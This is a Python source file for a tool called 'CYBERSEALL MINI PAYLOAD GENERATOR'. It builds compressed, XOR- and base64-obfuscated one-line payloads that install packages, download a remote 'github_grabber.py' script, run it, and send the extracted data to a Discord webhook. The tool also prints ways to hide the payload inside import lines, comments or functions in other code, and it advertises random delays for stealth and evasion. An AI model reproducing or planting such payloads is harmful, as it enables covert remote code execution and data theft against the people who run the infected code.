import os
import sys
import json
import base64
import random
import string
import subprocess
import shutil
from colorama import Fore, Style, init

init()

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

def center(text):
    try:
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 80
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * max(0, padding) + text

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    line = center(text)
    print(ansi + line + '\033[0m')

def create_short_payload(webhook_url, github_url):
    import zlib

    minimal_core = f"__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','requests','pycryptodome'],capture_output=1);exec(__import__('requests').get('{github_url}').text.replace('WEBHOOK_PLACEHOLDER','{webhook_url}'))"

    compressed = base64.b64encode(zlib.compress(minimal_core.encode(), 9)).decode()

    short_payload = f";import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))"

    return short_payload

def create_long_payload(webhook_url, github_url):
    import zlib, bz2

    libs = "72657175657374732c7079637279707464616d652c707375746c2c776562736f636b65742d636c69656e74"

    def x(s,k=42):return''.join(chr(ord(c)^k)for c in s)

    w = base64.b64encode(x(webhook_url,42).encode()).decode()
    g = base64.b64encode(x(github_url,42).encode()).decode()

    core = f"__import__('subprocess').run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('{libs}').decode().split(','),capture_output=1);__import__('time').sleep(__import__('random').random()*.5+.1);exec(__import__('requests').get(''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{g}').decode())).text.replace('WEBHOOK_PLACEHOLDER',''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{w}').decode())))"

    bz2_comp = bz2.compress(core.encode(), 9)
    final_comp = base64.b64encode(zlib.compress(bz2_comp, 9)).decode()

    base_payload = f";import zlib,bz2,base64,time,random;time.sleep(random.random()*.2+.1);exec(bz2.decompress(zlib.decompress(base64.b64decode('{final_comp}'))))"

    optimizations = [
        base_payload,

        base_payload.replace('time.sleep(random.random()*.2+.1)', '__import__("time").sleep(__import__("random").random()*.2)'),

        f";import zlib,bz2,base64;__import__('time').sleep(__import__('random').random()*.2);exec(bz2.decompress(zlib.decompress(base64.b64decode('{final_comp}'))))",

        f";import zlib,bz2,base64;exec(bz2.decompress(zlib.decompress(base64.b64decode('{final_comp}'))))"
    ]

    shortest = min(optimizations, key=len)

    if len(shortest) > 600:

        simple_core = f"__import__('subprocess').run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('{libs}').decode().split(','),capture_output=1);exec(__import__('requests').get(''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{g}').decode())).text.replace('WEBHOOK_PLACEHOLDER',''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{w}').decode())))"
        simple_comp = base64.b64encode(zlib.compress(simple_core.encode(), 9)).decode()
        simple_payload = f";import zlib,base64;exec(zlib.decompress(base64.b64decode('{simple_comp}')))"
        if len(simple_payload) < len(shortest):
            return simple_payload

    return shortest

def create_payload_variants(webhook_url, github_url):

    short = create_short_payload(webhook_url, github_url)

    long = create_long_payload(webhook_url, github_url)

    return {
        'short': short,
        'long': long
    }

def run_mini_payload_generator():
    os.system('cls' if os.name == 'nt' else 'clear')

    pretty_print("CYBERSEALL MINI PAYLOAD GENERATOR", (255, 0, 0))
    pretty_print("Ultra-short Payloads with GitHub Download", (255, 64, 64))
    print()

    webhook_url = input(rgb(255, 32, 32) + center("Enter Discord Webhook URL: ") + '\033[0m')
    if not webhook_url or not webhook_url.strip():
        pretty_print("No webhook URL provided!", (255, 0, 0))
        return

    print()
    default_github_url = "https://raw.githubusercontent.com/SellMeFish/TTS-Spammer/main/utils/github_grabber.py"
    github_url = input(rgb(255, 32, 32) + center(f"Enter GitHub Raw URL (Enter for default): ") + '\033[0m')
    if not github_url or not github_url.strip():
        github_url = default_github_url
        pretty_print(f"Using default GitHub URL", (0, 255, 0))

    print()
    pretty_print("PAYLOAD VARIANTS:", (255, 128, 0))
    print(rgb(150, 255, 150) + center("1. SHORT - Ultra-compact, minimal libraries (fastest)") + '\033[0m')
    print(rgb(150, 255, 150) + center("2. LONG - Full stealth with encryption (most secure)") + '\033[0m')
    print()

    variant = input(rgb(255, 32, 32) + center("Choose variant (1=Short, 2=Long) or Enter for Short: ") + '\033[0m')
    if not variant or variant not in ['1', '2']:
        variant = "1"

    confirm = input(rgb(255, 32, 32) + center("Generate Ultra-Stealth Payload? (y/n): ") + '\033[0m')

    if confirm.lower() != 'y':
        pretty_print("Cancelled!", (255, 0, 0))
        return

    try:
        payloads = create_payload_variants(webhook_url.strip(), github_url.strip())

        if variant == "1":
            stealth_payload = payloads['short']
            payload_type = "SHORT (Ultra-Compact)"
        else:
            stealth_payload = payloads['long']
            payload_type = "LONG (Full Stealth)"

        with open("stealth_payload.py", 'w', encoding='utf-8') as f:
            f.write(stealth_payload)

        pretty_print("Stealth Payload created successfully!", (0, 255, 0))
        print()

        pretty_print("PAYLOAD LENGTH:", (255, 128, 0))
        length = len(stealth_payload)
        color = (0, 255, 0) if length < 400 else (255, 255, 0) if length < 600 else (255, 128, 0)
        print(rgb(*color) + center(f"stealth_payload.py: {length} characters") + '\033[0m')

        print()
        pretty_print("HIDING METHODS:", (255, 128, 0))
        print()

        short_payload = stealth_payload[:80] + "..." if len(stealth_payload) > 80 else stealth_payload

        print(rgb(200, 255, 200) + center("# 1. Import hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"import os; {short_payload}") + '\033[0m')
        print()

        print(rgb(200, 255, 200) + center("# 2. Comment hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"# System check: {short_payload}") + '\033[0m')
        print()

        print(rgb(200, 255, 200) + center("# 3. Function hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"def update(): {short_payload}") + '\033[0m')
        print()

        pretty_print("WORKFLOW:", (255, 128, 0))

        if variant == "1":
            workflow = [
                "1. ;import prefix ensures compatibility",
                "2. Zlib decompression of minimal payload",
                "3. Installs: requests, pycryptodome (essential only)",
                "4. Downloads GitHub Grabber directly",
                "5. Executes complete data extraction",
                "6. Sends results to Discord webhook",
                "7. Fast execution, minimal footprint"
            ]
        else:
            workflow = [
                "1. ;import prefix ensures compatibility",
                "2. Random timing delays for stealth",
                "3. BZ2 + Zlib double decompression",
                "4. XOR + Base64 URL encryption",
                "5. Installs stealth libraries (4 packages)",
                "6. Downloads encrypted GitHub Grabber",
                "7. Executes advanced data extraction",
                "8. Sends encrypted results to webhook",
                "9. Maximum stealth and evasion"
            ]

        for step in workflow:
            print(rgb(150, 255, 150) + center(step) + '\033[0m')

        print()
        pretty_print(f"GENERATED PAYLOAD ({payload_type}):", (255, 0, 0))
        print()
        print(rgb(255, 255, 0) + center(stealth_payload) + '\033[0m')
        print()
        pretty_print(f"Length: {len(stealth_payload)} characters", (255, 255, 0))
        pretty_print(f"Type: {payload_type}", (255, 128, 0))

        print()
        pretty_print("PAYLOAD COMPARISON:", (255, 128, 0))

        short_payload_len = len(payloads['short'])
        long_payload_len = len(payloads['long'])

        print(rgb(150, 255, 150) + center(f"SHORT Variant: {short_payload_len} chars") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"LONG Variant: {long_payload_len} chars") + '\033[0m')
        print(rgb(255, 255, 0) + center(f"Selected ({payload_type}): {len(stealth_payload)} chars") + '\033[0m')

        print()
        pretty_print("VARIANT BENEFITS:", (255, 128, 0))

        if variant == "1":
            print(rgb(0, 255, 0) + center("✓ SHORT Benefits:") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Ultra-compact size (~340 chars)") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Fastest execution") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Minimal library dependencies") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Basic compression (Zlib)") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Starts with ;import prefix") + '\033[0m')
        else:
            print(rgb(0, 255, 0) + center("✓ LONG Benefits:") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Maximum stealth features (~550 chars)") + '\033[0m')
            print(rgb(150, 255, 150) + center("• XOR + Base64 encryption") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Double compression (BZ2 + Zlib)") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Random timing delays") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Stealth libraries included") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Starts with ;import prefix") + '\033[0m')

    except Exception as e:
        pretty_print(f"Error creating payloads: {str(e)}", (255, 0, 0))

    print()
    input(rgb(255, 32, 32) + center("Press Enter to continue...") + '\033[0m')

if __name__ == "__main__":
    run_mini_payload_generator()

# update
